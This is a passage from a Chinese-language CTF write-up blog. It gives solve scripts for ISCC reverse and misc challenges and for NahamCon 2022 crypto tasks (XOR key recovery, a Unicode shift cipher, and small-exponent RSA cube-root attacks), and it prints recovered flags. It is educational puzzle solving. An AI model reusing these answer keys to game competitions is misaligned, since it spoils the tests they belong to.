[ebp-B4h]</span><br>  <span class="hljs-type">char</span> v6[<span class="hljs-number">24</span>]; <span class="hljs-comment">// [esp+174h] [ebp-A8h] BYREF</span><br>  <span class="hljs-type">int</span> v7; <span class="hljs-comment">// [esp+18Ch] [ebp-90h]</span><br>  __int16 v8; <span class="hljs-comment">// [esp+190h] [ebp-8Ch]</span><br>  <span class="hljs-type">int</span> v9[<span class="hljs-number">31</span>]; <span class="hljs-comment">// [esp+19Ch] [ebp-80h]</span><br><br>  v9[<span class="hljs-number">0</span>] = <span class="hljs-number">149</span>;v9[<span class="hljs-number">1</span>] = <span class="hljs-number">169</span>;v9[<span class="hljs-number">2</span>] = <span class="hljs-number">137</span>;v9[<span class="hljs-number">3</span>] = <span class="hljs-number">134</span>;<br>  v9[<span class="hljs-number">4</span>] = <span class="hljs-number">212</span>;v9[<span class="hljs-number">5</span>] = <span class="hljs-number">188</span>;v9[<span class="hljs-number">6</span>] = <span class="hljs-number">177</span>;v9[<span class="hljs-number">7</span>] = <span class="hljs-number">184</span>;<br>  v9[<span class="hljs-number">8</span>] = <span class="hljs-number">177</span>;v9[<span class="hljs-number">9</span>] = <span class="hljs-number">197</span>;v9[<span class="hljs-number">10</span>] = <span class="hljs-number">192</span>;v9[<span class="hljs-number">11</span>] = <span class="hljs-number">179</span>;<br>  v9[<span class="hljs-number">12</span>] = <span class="hljs-number">153</span>;v9[<span class="hljs-number">13</span>] = <span class="hljs-number">197</span>;v9[<span class="hljs-number">14</span>] = <span class="hljs-number">159</span>;v9[<span class="hljs-number">15</span>] = <span class="hljs-number">163</span>;<br>  v9[<span class="hljs-number">16</span>] = <span class="hljs-number">160</span>;v9[<span class="hljs-number">17</span>] = <span class="hljs-number">167</span>;v9[<span class="hljs-number">18</span>] = <span class="hljs-number">169</span>;v9[<span class="hljs-number">19</span>] = <span class="hljs-number">184</span>;<br>  v9[<span class="hljs-number">20</span>] = <span class="hljs-number">0</span>;v9[<span class="hljs-number">21</span>] = <span class="hljs-number">0</span>;v9[<span class="hljs-number">22</span>] = <span class="hljs-number">0</span>;v9[<span class="hljs-number">23</span>] = <span class="hljs-number">0</span>;<br>  v9[<span class="hljs-number">24</span>] = <span class="hljs-number">0</span>;v9[<span class="hljs-number">25</span>] = <span class="hljs-number">0</span>;v9[<span class="hljs-number">26</span>] = <span class="hljs-number">0</span>;v9[<span class="hljs-number">27</span>] = <span class="hljs-number">0</span>;<br>  v9[<span class="hljs-number">28</span>] = <span class="hljs-number">0</span>;v9[<span class="hljs-number">29</span>] = <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">strcpy</span>(v6, <span class="hljs-string">&quot;LWHFUENGDJGEFHYDHIGJ&quot;</span>);<span class="hljs-comment">//len = 20</span><br>  v7 = <span class="hljs-number">0</span>;<br>  v8 = <span class="hljs-number">0</span>;<br>  v5 = j__strlen(Str);<br>  j__memset(v4, <span class="hljs-number">0</span>, <span class="hljs-number">0x78</span>u);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; v5; ++i )<br>    v4[i] = v6[i] + Str[i];<br>  <span class="hljs-keyword">for</span> ( j = <span class="hljs-number">0</span>; j &lt; v5; ++j )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( v4[j] != v9[j] )<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>接下来只要逆这个运算过程即可。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; v5; ++i )<br>    v4[i] = v6[i] + Str[i];<br></code></pre></td></tr></table></figure><p>首先我们来解出Str是什么。看样子str长度应该要为20。由此得到我们这个函数期望输入的字符串。接下来再反向sub_4128A0函数即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># solve.py</span><br><br>v9 = [<br>    <span class="hljs-number">149</span>, <span class="hljs-number">169</span>, <span class="hljs-number">137</span>, <span class="hljs-number">134</span>,<br>    <span class="hljs-number">212</span>, <span class="hljs-number">188</span>, <span class="hljs-number">177</span>, <span class="hljs-number">184</span>,<br>    <span class="hljs-number">177</span>, <span class="hljs-number">197</span>, <span class="hljs-number">192</span>, <span class="hljs-number">179</span>,<br>    <span class="hljs-number">153</span>, <span class="hljs-number">197</span>, <span class="hljs-number">159</span>, <span class="hljs-number">163</span>,<br>    <span class="hljs-number">160</span>, <span class="hljs-number">167</span>, <span class="hljs-number">169</span>, <span class="hljs-number">184</span>,<br>    <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>,<br>    <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>,<br>    <span class="hljs-number">0</span>, <span class="hljs-number">0</span>]<br><br>v6 = <span class="hljs-string">&quot;LWHFUENGDJGEFHYDHIGJ&quot;</span><br><br>inputStr = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(v6)):<br>    inputStr.append(v9[i] - <span class="hljs-built_in">ord</span>(v6[i]))<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(inputStr)):<br>    inputStr[i] ^= i<br><br><span class="hljs-built_in">print</span>([<span class="hljs-built_in">chr</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> inputStr])<br><br><span class="hljs-comment"># ISCC&#123;reverse_pHPHOp&#125;</span><br></code></pre></td></tr></table></figure><h2 id="getthetable"><a class="markdownIt-Anchor" href="#getthetable"></a> GetTheTable</h2><div class="note note-info">            <p>于2022-05-11新增</p>          </div><p>下载附件IDA打开。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">n1 = <span class="hljs-number">18</span>;<br>  <span class="hljs-built_in">strcpy</span>(str, <span class="hljs-string">&quot;ERaQux2uV3u5F736EjkECSDVLp&quot;</span>);<br>  <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>, plainText);<br>  n = <span class="hljs-built_in">strlen</span>(plainText);<br>  <span class="hljs-keyword">if</span> ( n &lt;= <span class="hljs-number">32</span> )<br>  &#123;<br>    *(_QWORD *)&amp;len[<span class="hljs-number">4</span>] = <span class="hljs-number">0</span>i64;<br>    *(_QWORD *)len = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)(<span class="hljs-number">138</span> * <span class="hljs-built_in">strlen</span>(plainText) / <span class="hljs-number">0x64</span>) + <span class="hljs-number">1</span>;<br>    <span class="hljs-built_in">strcpy</span>(str12581, <span class="hljs-string">&quot;123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz&quot;</span>);<br>    encryption = (<span class="hljs-type">char</span> *)<span class="hljs-built_in">malloc</span>(*(<span class="hljs-type">int</span> *)len);<br>    index = <span class="hljs-number">0</span>;<br></code></pre></td></tr></table></figure><p>是base58加密。str应该就是我们加密过后的字符串。把字符串拿出来进行base58解密即可得到flag。</p><h1 id="未完成"><a class="markdownIt-Anchor" href="#未完成"></a> 未完成</h1><h2 id="藏在星空中的诗-2"><a class="markdownIt-Anchor" href="#藏在星空中的诗-2"></a> 藏在星空中的诗-2</h2><div class="note note-info">            <p>于2022-05-12新增</p>          </div><p>下载附件，里面就一个文本文件。</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-string">\🌟🌠🌠✴🟉\🌟🌠🌠★⍣\🌟🌠🌠✴⍣\🌟🌠🌠✴⍣\🌟🌠🌠✧≛\🌟🌠🌠✧🟉\🌟🌠🌠✴🟉\🌟🌠🌠✴🟌\🌟🌠🌠✧✧\🌟🌠🌠✲≛\🌟🌠🌠☆🟌\🌟🌠🌠✧✡\🌟🌠🌠☆🟌\🌟🌠🌠★✧\🌟🌠🌠⍣✸\🌟🌠🌠✴⍣\🌟🌠🌠✧🟉\🌟🌠🌠✴✡\🌟🌠🌠★★\🌟🌠🌠✧⚝</span><br></code></pre></td></tr></table></figure><p>可以看到有个斜杠。这个应该是unicode。Unicode有好几种分隔符，使用\开头的有\u和\u+，这个看样子是\u。所以🌟可以替换位u。观察到每个unicode前面都有🌠🌠，而英文字符的unicode前面都是00。猜测这个替换了00，所以将其替换回去。</p><p>这里猜测前五个字符是“ISCC{”而最后一个字符是&quot;}&quot;。可以得到对应的Unicode编码。</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">ISCC&#123;<br><span class="hljs-symbol">\u0049</span><span class="hljs-symbol">\u0053</span><span class="hljs-symbol">\u0043</span><span class="hljs-symbol">\u0043</span><span class="hljs-symbol">\u007b</span><br>&#125;<br><span class="hljs-symbol">\u007d</span><br></code></pre></td></tr></table></figure><p>可以发现前面其实可以对上的。你看文件中第三个和第四个编码，是一样的。很有可能就是我们猜测的样子。得到编码后对应替换。</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript"><span class="hljs-symbol">\u0049</span><span class="hljs-symbol">\u0053</span><span class="hljs-symbol">\u0043</span><span class="hljs-symbol">\u0043</span><span class="hljs-symbol">\u007b</span><span class="hljs-symbol">\u0079</span><span class="hljs-symbol">\u0049</span>\u004🟌<span class="hljs-symbol">\u0077</span>\u00✲b\u00☆🟌\u007✡\u00☆🟌<span class="hljs-symbol">\u0057</span>\u003✸<span class="hljs-symbol">\u0043</span><span class="hljs-symbol">\u0079</span>\u004✡<span class="hljs-symbol">\u0055</span><span class="hljs-symbol">\u007d</span><br></code></pre></td></tr></table></figure><p>最后得到这个。这里面最后还有几个字符不知道。看看能不能再找出几个替代。</p><p>对于当前的十六进制我们已经有了[0,3,4,5,7,9,b,d],那么还剩下[1,2,6,8,a,c,e,f]。</p><p>对于\u00✲b</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ada">\u002b: +<br>\u006b: <span class="hljs-type">k</span><br></code></pre></td></tr></table></figure><p>所以应该是6。</p><p>对于\u007✡，可选的只有[1,2,8,a,c,e,f]</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-string">\u0071</span>:q<br><span class="hljs-string">\u0072</span>:r<br><span class="hljs-string">\u0078</span>:x<br><span class="hljs-string">\u007a</span>:z<br><span class="hljs-string">\u007c</span>:|<br><span class="hljs-string">\u007e</span>:~<br><span class="hljs-string">\u007f</span>:不可见<br></code></pre></td></tr></table></figure><p>c,e,f被排除。当前可选1，2，8，a</p><p>对于\u003✸，可选[1,2,8,a,c,e,f]</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-string">\u0031</span>:<span class="hljs-number">1</span><br><span class="hljs-string">\u0032</span>:<span class="hljs-number">2</span><br><span class="hljs-string">\u0038</span>:<span class="hljs-number">8</span><br><span class="hljs-string">\u003a</span>::<br><span class="hljs-string">\u003c</span>:&lt;<br><span class="hljs-string">\u003e</span>:&gt;<br><span class="hljs-string">\u003f</span>:?<br></code></pre></td></tr></table></figure><p>可选1，2，8</p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>writeup</tag>
      
      <tag>MISC</tag>
      
      <tag>Reverse</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NahamCon2022</title>
    <link href="/2022/05/01/NahamCon2022/"/>
    <url>/2022/05/01/NahamCon2022/</url>
    
    <content type="html"><![CDATA[<p>NahamCon CTF 2022 中 XORROX、Unimod、Baby RSA Quiz 和 Ostrich 的题解。</p><span id="more"></span><p>今天玩了玩NahamCon CTF 2022，凌晨三点开始比赛。当然，我肯定是睡觉起床了再打。</p><p>起床之后队友把热身题全扫了，我也没啥题可以做了（菜鸡一个。后面找了以下难度不大的crypto写。以下是writeup。后面我还会写一下别人的writeup，因为有些题没写出来。</p><h1 id="xorrox"><a class="markdownIt-Anchor" href="#xorrox"></a> XORROX</h1><figure class="highlight python"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><br><span class="hljs-keyword">import</span> random<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag.txt&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> filp:<br>    flag = filp.read().strip()<br><br>key = [random.randint(<span class="hljs-number">1</span>, <span class="hljs-number">256</span>) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(flag))]<br><br>xorrox = []<br>enc = []<br><span class="hljs-keyword">for</span> i, v <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(key):<br>    k = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(i, <span class="hljs-number">0</span>, -<span class="hljs-number">1</span>):<br>        k ^= key[j]<br>    xorrox.append(k)<br>    enc.append(flag[i] ^ v)<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;output.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">as</span> filp:<br>    filp.write(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;xorrox=&#125;</span>\n&quot;</span>)<br>    filp.write(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;enc=&#125;</span>\n&quot;</span>)<br><br></code></pre></td></tr></table></figure><p>可以看到是一个简单的多次异或。异或是可逆的，而且我们的key元素中的第一个也就是key[0]是不会被修改的。所以我们只需要再跑一下这个循环，把key跑出来就行了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># solve.py</span><br>xorrox=[<span class="hljs-number">1</span>, <span class="hljs-number">209</span>, <span class="hljs-number">108</span>, <span class="hljs-number">239</span>, <span class="hljs-number">4</span>, <span class="hljs-number">55</span>, <span class="hljs-number">34</span>, <span class="hljs-number">174</span>, <span class="hljs-number">79</span>, <span class="hljs-number">117</span>, <span class="hljs-number">8</span>, <span class="hljs-number">222</span>, <span class="hljs-number">123</span>, <span class="hljs-number">99</span>, <span class="hljs-number">184</span>, <span class="hljs-number">202</span>, <span class="hljs-number">95</span>, <span class="hljs-number">255</span>, <span class="hljs-number">175</span>, <span class="hljs-number">138</span>, <span class="hljs-number">150</span>, <span class="hljs-number">28</span>, <span class="hljs-number">183</span>, <span class="hljs-number">6</span>, <span class="hljs-number">168</span>, <span class="hljs-number">43</span>, <span class="hljs-number">205</span>, <span class="hljs-number">105</span>, <span class="hljs-number">92</span>, <span class="hljs-number">250</span>, <span class="hljs-number">28</span>, <span class="hljs-number">80</span>, <span class="hljs-number">31</span>, <span class="hljs-number">201</span>, <span class="hljs-number">46</span>, <span class="hljs-number">20</span>, <span class="hljs-number">50</span>, <span class="hljs-number">56</span>]<br>enc=[<span class="hljs-number">26</span>, <span class="hljs-number">188</span>, <span class="hljs-number">220</span>, <span class="hljs-number">228</span>, <span class="hljs-number">144</span>, <span class="hljs-number">1</span>, <span class="hljs-number">36</span>, <span class="hljs-number">185</span>, <span class="hljs-number">214</span>, <span class="hljs-number">11</span>, <span class="hljs-number">25</span>, <span class="hljs-number">178</span>, <span class="hljs-number">145</span>, <span class="hljs-number">47</span>, <span class="hljs-number">237</span>, <span class="hljs-number">70</span>, <span class="hljs-number">244</span>, <span class="hljs-number">149</span>, <span class="hljs-number">98</span>, <span class="hljs-number">20</span>, <span class="hljs-number">46</span>, <span class="hljs-number">187</span>, <span class="hljs-number">207</span>, <span class="hljs-number">136</span>, <span class="hljs-number">154</span>, <span class="hljs-number">231</span>, <span class="hljs-number">131</span>, <span class="hljs-number">193</span>, <span class="hljs-number">84</span>, <span class="hljs-number">148</span>, <span class="hljs-number">212</span>, <span class="hljs-number">126</span>, <span class="hljs-number">126</span>, <span class="hljs-number">226</span>, <span class="hljs-number">211</span>, <span class="hljs-number">10</span>, <span class="hljs-number">20</span>, <span class="hljs-number">119</span>]<br>key = []<br><span class="hljs-keyword">for</span> i, v <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(xorrox):<br>    k = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(i, <span class="hljs-number">0</span>, -<span class="hljs-number">1</span>):<br>        k ^= xorrox[j]<br>    xorrox[i] = k<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(enc[i]^k), end=<span class="hljs-string">&quot;&quot;</span>)<br>    key.append(k)<br><span class="hljs-built_in">print</span>(key, <span class="hljs-built_in">len</span>(key))<br><br>    <br>xorrox = []<br><span class="hljs-keyword">for</span> i, v <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(key):<br>    k = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(i, <span class="hljs-number">0</span>, -<span class="hljs-number">1</span>):<br>        k ^= key[j]<br>    xorrox.append(k)<br><span class="hljs-built_in">print</span>(xorrox)<br></code></pre></td></tr></table></figure><h1 id="unimod"><a class="markdownIt-Anchor" href="#unimod"></a> Unimod</h1><p>这题有点蛋疼。因为直接看数据文件格式有点不对。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> libnum<br><br>flag = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>).read()<br>ct = <span class="hljs-string">&#x27;&#x27;</span><br>k = random.randrange(<span class="hljs-number">0</span>,<span class="hljs-number">0xFFFD</span>)<br><span class="hljs-comment"># k = 15449</span><br><span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> flag:<br>    <br>    ct += <span class="hljs-built_in">chr</span>((<span class="hljs-built_in">ord</span>(c) + k) % <span class="hljs-number">0xFFFD</span>)<br>    <br>    <span class="hljs-comment"># a = chr((ord(c) + k) % 0xFFFD)</span><br>    <span class="hljs-comment"># print((ord(c) + k) % 0xFFFD)</span><br>    <span class="hljs-comment"># print(libnum.s2n(chr((ord(c) + k) % 0xFFFD)))</span><br>    <span class="hljs-comment"># print(ord(a))</span><br><br><span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;out&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>).write(ct.encode())<br><br></code></pre></td></tr></table></figure><p>注释部分是我测试的部分。原题目是没有的。</p><p>以下是原题目的十六进制数据。可以看到很明显的三个字节一个分组。但是从代码上看，我们的到的数据应该是两个字节一个分组。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">E9</span> A5 <span class="hljs-number">87</span> E9 A5 <span class="hljs-number">8</span>D E9 A5 <span class="hljs-number">82</span> E9 A5 <span class="hljs-number">88</span> E9 A5 <span class="hljs-number">9</span>C E9 A4 <span class="hljs-number">95</span> E9 A5 <span class="hljs-number">86</span> E9 A4 <span class="hljs-number">97</span> E9 A4 <span class="hljs-number">99</span> E9 A5 <span class="hljs-number">85</span> E9 A4 <span class="hljs-number">92</span> E9 A4 <span class="hljs-number">97</span> E9 A5 <span class="hljs-number">82</span> E9 A4 <span class="hljs-number">97</span> E9 A4 <span class="hljs-number">92</span> E9 A5 <span class="hljs-number">83</span> E9 A5 <span class="hljs-number">84</span> E9 A4 <span class="hljs-number">93</span> E9 A5 <span class="hljs-number">86</span> E9 A5 <span class="hljs-number">82</span> E9 A4 <span class="hljs-number">98</span> E9 A4 <span class="hljs-number">93</span> E9 A5 <span class="hljs-number">85</span> E9 A4 <span class="hljs-number">96</span> E9 A5 <span class="hljs-number">87</span> E9 A4 <span class="hljs-number">9</span>A E9 A4 <span class="hljs-number">98</span> E9 A4 <span class="hljs-number">92</span> E9 A4 <span class="hljs-number">94</span> E9 A4 <span class="hljs-number">95</span> E9 A4 <span class="hljs-number">95</span> E9 A5 <span class="hljs-number">86</span> E9 A4 <span class="hljs-number">99</span> E9 A4 <span class="hljs-number">95</span> E9 A5 <span class="hljs-number">87</span> E9 A4 <span class="hljs-number">92</span> E9 A4 <span class="hljs-number">92</span> E9 A5 <span class="hljs-number">9</span>E E9 A3 AB<br></code></pre></td></tr></table></figure><p>所以有了注释中的三条输出语句：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">15565<br>14922637<br>15565<br></code></pre></td></tr></table></figure><p>可以看到，这个数据经过编码成了三个字节。所以我们直接读文件，然后用三个字节分组，使用<strong>ord</strong>函数来解码，才能得到正确的值。</p><p>这里其实有个k，但是影响不大。这里0xFFFD其实比我们ASCII码的范围大了太多。基本上不会出现取的k刚好在0xFFFD的边界上。所以直接解就行了，如果不行那也就再加个0xFFFD进行处理就行。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># solve.py</span><br>data = <span class="hljs-built_in">open</span>(<span class="hljs-string">r&quot;out&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>).read()<br><br><span class="hljs-comment"># 反正挺坑的，一个2字节的数据二进制写入成了3字节，这里直接三字节分片然后用ord取他的数字就行</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(data), <span class="hljs-number">3</span>):<br>    a = data[i:i+<span class="hljs-number">3</span>].decode()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(a) - <span class="hljs-number">39137</span>), end=<span class="hljs-string">&quot;&quot;</span>)<br><br>    <span class="hljs-comment"># 通过猜测第一个字符是&#x27;f&#x27;， 来计算k = 39137</span><br></code></pre></td></tr></table></figure><h1 id="baby-rsa-quiz"><a class="markdownIt-Anchor" href="#baby-rsa-quiz"></a> Baby RSA Quiz</h1><p>这题没有给文件而是以ssh的方式进行的。</p><p>一共三小题，第一小题给的是个小n，直接分解就行了。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"> ---------<br>| Part 1: |<br> ---------<br>n = 115398298544369<br>e = 65537<br>ct = 37386859625793<br><br>What is the plaintext (in integer form)?<br></code></pre></td></tr></table></figure><p>这个直接上网站一分解就行。得到p，q求解d，然后算m。这里答案是整型的，但其实也是能转成字符串的。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"> ---------<br>| Part 2: |<br> ---------<br> n = 21984385600649967782331863593924102436585066484191623195882222547673570244475780629687822167989708574426866726594728874805115343269798282457109572103808168717297643786879687407125835510708369369452066036081265495727817566573832554802942178842361272009775406486896598963082180982538712496148845771649987025233485619836564348850399478693602977813231635752371346486494990471592789061740477387129729970592609102941311866809610802313761260294058835607292101793124755896831042571976602987089357127373715869012159472398776658325559448411402063905089012465509274881162806001450685859679444595914638449991047584895744421268419<br> e = 3<br> ct = 26480272848384180570411447917437668635135597564435407928130220812155801611065536704781892656033726277516148813916446180796750368332515779970289682282804676030149428215146347671350240386440440048832713595112882403831539777582778645411270433913301224819057222081543727263602678819745693540865806160910293144052079393615890645460901858988883318691997438568705602949652125<br> What is the plaintext (in integer form)?<br></code></pre></td></tr></table></figure><p>这里可以看到加密指数e很小，所以我们只需要开方求解就行了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># solve.py</span><br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> iroot<br><span class="hljs-keyword">import</span> libnum<br><br>e = <span class="hljs-number">0x3</span><br>n = <span class="hljs-number">21984385600649967782331863593924102436585066484191623195882222547673570244475780629687822167989708574426866726594728874805115343269798282457109572103808168717297643786879687407125835510708369369452066036081265495727817566573832554802942178842361272009775406486896598963082180982538712496148845771649987025233485619836564348850399478693602977813231635752371346486494990471592789061740477387129729970592609102941311866809610802313761260294058835607292101793124755896831042571976602987089357127373715869012159472398776658325559448411402063905089012465509274881162806001450685859679444595914638449991047584895744421268419</span><br>c = <span class="hljs-number">26480272848384180570411447917437668635135597564435407928130220812155801611065536704781892656033726277516148813916446180796750368332515779970289682282804676030149428215146347671350240386440440048832713595112882403831539777582778645411270433913301224819057222081543727263602678819745693540865806160910293144052079393615890645460901858988883318691997438568705602949652125</span><br><br>k = <span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>    res = iroot(c + k * n, e)  <span class="hljs-comment"># c+k*n 开3次方根 能开3次方即可</span><br>    <span class="hljs-keyword">if</span> (res[<span class="hljs-number">1</span>] == <span class="hljs-literal">True</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">int</span>(res[<span class="hljs-number">0</span>]))<br>        <span class="hljs-built_in">print</span>(libnum.n2s(<span class="hljs-built_in">int</span>(res[<span class="hljs-number">0</span>])))  <span class="hljs-comment"># 转为字符串</span><br>        <span class="hljs-keyword">break</span><br>    k = k + <span class="hljs-number">1</span><br><br></code></pre></td></tr></table></figure><p>这里我打印了数字也打印了字符串，是从我之前的代码上改的。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 